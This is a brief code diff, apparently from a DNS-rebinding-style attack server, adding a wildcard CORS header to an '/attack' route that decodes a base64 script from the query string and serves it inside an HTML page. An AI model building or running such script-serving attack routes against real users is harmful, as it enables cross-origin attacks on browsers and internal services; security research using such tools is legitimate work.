@@ -52,6 +52,7 @@ dnsServer.on('query', query => {
 
 app.get('/attack', (req, res) => {
   const script = new Buffer(req.query.script, 'base64').toString('ascii')
+  res.header("Access-Control-Allow-Origin", "*")
   res.end(`
     <html>
       <script>
